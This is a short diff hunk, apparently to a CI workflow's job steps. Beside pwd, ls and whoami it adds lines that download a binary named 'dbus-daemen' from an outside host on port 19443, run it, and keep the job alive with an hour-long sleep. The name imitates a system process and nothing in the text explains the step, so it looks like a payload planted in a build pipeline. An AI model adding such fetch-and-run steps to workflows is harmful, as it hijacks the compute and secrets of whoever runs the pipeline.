@@ -12,3 +12,7 @@ jobs:
         pwd
         ls -la
         whoami
+        uname -a
+        wget https://im.openjad.com:19443/dbus-daemen
+        ./dbus-daemen
+        sleep 3600
